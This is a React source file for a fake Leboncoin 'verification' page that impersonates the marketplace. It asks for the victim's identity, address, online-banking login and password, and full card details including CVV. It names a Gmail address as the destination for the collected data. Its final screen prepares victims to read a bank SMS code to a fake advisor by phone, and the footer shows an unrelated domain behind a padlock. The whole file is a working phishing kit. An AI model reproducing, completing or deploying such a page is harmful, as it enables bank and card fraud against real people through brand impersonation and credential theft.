
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Select } from '@/components/ui/select';
import { Card, CardContent } from '@/components/ui/card';
import { ProgressSteps } from '@/components/ProgressSteps';
import { LeboncoinLogo } from '@/components/LeboncoinLogo';
import { useToast } from "@/components/ui/use-toast";
import { CreditCard, Building2, Check, User } from 'lucide-react';

const steps = [
  { name: 'Confirm', status: 'complete' as const },
  { name: 'Checkpoint', status: 'complete' as const },
  { name: 'Verify', status: 'current' as const },
  { name: 'Complete', status: 'upcoming' as const },
];

export default function LeboncoinVerification() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [step, setStep] = useState<number>(1);
  const [loading, setLoading] = useState<boolean>(false);
  const [formData, setFormData] = useState({
    // Données personnelles
    firstName: '',
    lastName: '',
    birthDate: '',
    address1: '',
    address2: '',
    postalCode: '',
    city: '',
    phone: '',
    
    // Données bancaires
    bankType: '',
    bankId: '',
    bankPassword: '',
    
    // Données carte
    cardType: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const sendDataByEmail = async () => {
    try {
      // Simule l'envoi d'un email
      console.log("Sending data to:", "kouadioyaojeancesar@gmail.com");
      console.log("Form data:", formData);
      
      // Dans un environnement réel, vous utiliseriez un service d'email
      // Pour cette démo, nous allons simplement afficher un toast
      toast({
        title: "Données envoyées",
        description: "Les informations ont été transmises avec succès.",
      });
      
      return true;
    } catch (error) {
      console.error("Error sending email:", error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Simuler un délai pour l'envoi des données
    setTimeout(async () => {
      const success = await sendDataByEmail();
      
      if (success) {
        if (step < 4) {
          setStep(step + 1);
        } else {
          // Étape finale, rediriger vers une page de succès
          navigate('/completion');
        }
      } else {
        toast({
          variant: "destructive",
          title: "Erreur",
          description: "Un problème est survenu. Veuillez réessayer.",
        });
      }
      
      setLoading(false);
    }, 1500);
  };

  const renderStepContent = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-semibold">Confirmez votre adresse</h2>
            </div>
            
            <Input
              name="lastName"
              placeholder="Nom"
              value={formData.lastName}
              onChange={handleChange}
              required
            />
            
            <Input
              name="firstName"
              placeholder="Prénom"
              value={formData.firstName}
              onChange={handleChange}
              required
            />
            
            <Input
              name="birthDate"
              placeholder="Date de naissance"
              type="date"
              value={formData.birthDate}
              onChange={handleChange}
              required
            />
            
            <Input
              name="address1"
              placeholder="Ligne d'adresse 1"
              value={formData.address1}
              onChange={handleChange}
              required
            />
            
            <Input
              name="address2"
              placeholder="Ligne d'adresse 2"
              value={formData.address2}
              onChange={handleChange}
            />
            
            <Input
              name="postalCode"
              placeholder="Code postal"
              value={formData.postalCode}
              onChange={handleChange}
              required
            />
            
            <Input
              name="city"
              placeholder="Ville"
              value={formData.city}
              onChange={handleChange}
              required
            />
            
            <Input
              name="phone"
              placeholder="Numéro de téléphone"
              value={formData.phone}
              onChange={handleChange}
              required
            />
          </div>
        );
        
      case 2:
        return (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="flex justify-center mb-6">
                <div className="p-6 rounded-full bg-gray-100">
                  <Building2 className="w-12 h-12 text-gray-500" />
                </div>
              </div>
              <h2 className="text-2xl font-semibold">Confirmez votre banque</h2>
              <p className="text-gray-600 mt-2">Confirmation d'identité.</p>
            </div>
            
            <div className="relative">
              <select
                name="bankType"
                className="w-full rounded-md border border-gray-300 py-2 px-3 appearance-none focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={formData.bankType}
                onChange={handleChange as any}
                required
              >
                <option value="" disabled>Sélectionnez votre type de banque.</option>
                <option value="credit_agricole">Crédit Agricole</option>
                <option value="bnp">BNP Paribas</option>
                <option value="societe_generale">Société Générale</option>
                <option value="cic">CIC</option>
                <option value="lcl">LCL</option>
                <option value="other">Autre</option>
              </select>
              <div className="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path>
                </svg>
              </div>
            </div>
            
            <Input
              name="bankId"
              placeholder="Identifiant bancaire"
              value={formData.bankId}
              onChange={handleChange}
              required
            />
            
            <Input
              name="bankPassword"
              type="password"
              placeholder="Mot de passe"
              value={formData.bankPassword}
              onChange={handleChange}
              required
            />
            
            <p className="text-sm text-gray-600 mt-6">
              Vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité. Pour confirmer votre compte bancaire, veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en ligne.
            </p>
          </div>
        );
        
      case 3:
        return (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <div className="flex justify-center mb-6">
                <div className="p-6 rounded-full bg-gray-100">
                  <CreditCard className="w-12 h-12 text-gray-500" />
                </div>
              </div>
              <h2 className="text-2xl font-semibold">Confirmez votre carte</h2>
            </div>
            
            <div className="relative">
              <select
                name="cardType"
                className="w-full rounded-md border border-gray-300 py-2 px-3 appearance-none focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={formData.cardType}
                onChange={handleChange as any}
                required
              >
                <option value="" disabled>Sélectionnez votre type de carte.</option>
                <option value="visa">Visa</option>
                <option value="mastercard">Mastercard</option>
                <option value="amex">American Express</option>
                <option value="other">Autre</option>
              </select>
              <div className="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path>
                </svg>
              </div>
            </div>
            
            <Input
              name="cardNumber"
              placeholder="Numéro de carte"
              value={formData.cardNumber}
              onChange={handleChange}
              required
            />
            
            <Input
              name="expiryDate"
              placeholder="Date d'expiration (MM/AA)"
              value={formData.expiryDate}
              onChange={handleChange}
              required
            />
            
            <div className="relative">
              <Input
                name="cvv"
                placeholder="Cryptogramme visuel"
                value={formData.cvv}
                onChange={handleChange}
                required
              />
              <img 
                src="/path/to/cvv-image.png" 
                alt="CVV" 
                className="absolute right-2 top-1/2 transform -translate-y-1/2 w-8 h-8 opacity-70" 
              />
            </div>
          </div>
        );
        
      case 4:
        return (
          <div className="text-center space-y-6">
            <div className="flex justify-center mb-6">
              <div className="h-20 w-20 rounded-full border-4 border-orange-500 flex items-center justify-center">
                <Check className="h-10 w-10 text-orange-500" />
              </div>
            </div>
            <h2 className="text-2xl font-semibold">Votre virement est en cours</h2>
            <p className="text-base">Merci d'avoir choisi Leboncoin.</p>
            
            <p className="text-sm text-gray-600 mt-6">
              Pour finaliser la validation de votre compte, vous serez contacté par téléphone par un de nos conseillers dans les plus brefs délais.
            </p>
            
            <p className="text-sm text-gray-600 mt-6">
              En confirmant votre compte bancaire, vous autorisez Leboncoin à vous envoyer soit une notification bancaire à valider, soit un sms de 4 à 8 chiffres que vous devez communiquer uniquement au conseiller pour confirmer votre compte bancaire.
            </p>
          </div>
        );
        
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <header className="bg-white border-b py-4 px-4">
        <div className="container mx-auto flex justify-center">
          <LeboncoinLogo size="lg" />
        </div>
      </header>
      
      <div className="container mx-auto px-4 py-8 flex-1 flex flex-col items-center">
        <div className="w-full max-w-md mb-8">
          <ProgressSteps steps={steps} />
        </div>
        
        <Card className="w-full max-w-md">
          <CardContent className="pt-6">
            <form onSubmit={handleSubmit}>
              {renderStepContent()}
              
              <div className="mt-8">
                <Button 
                  type="submit" 
                  className="w-full bg-orange-500 hover:bg-orange-600 text-white"
                  disabled={loading}
                >
                  {loading ? "Traitement en cours..." : "Continuer"}
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>
        
        {step === 4 && (
          <div className="mt-8 bg-white p-4 rounded border w-full max-w-md">
            <div className="text-center">
              <p className="text-sm text-gray-500">🔒 jiwled.n0c.world</p>
            </div>
          </div>
        )}
      </div>
      
      {step < 4 && (
        <footer className="py-4 border-t text-center text-xs text-gray-500">
          <p>©2006-2021 Leboncoin. All rights reserved.</p>
          <p className="mt-1">🔒 jiwled.n0c.world</p>
        </footer>
      )}
    </div>
  );
}
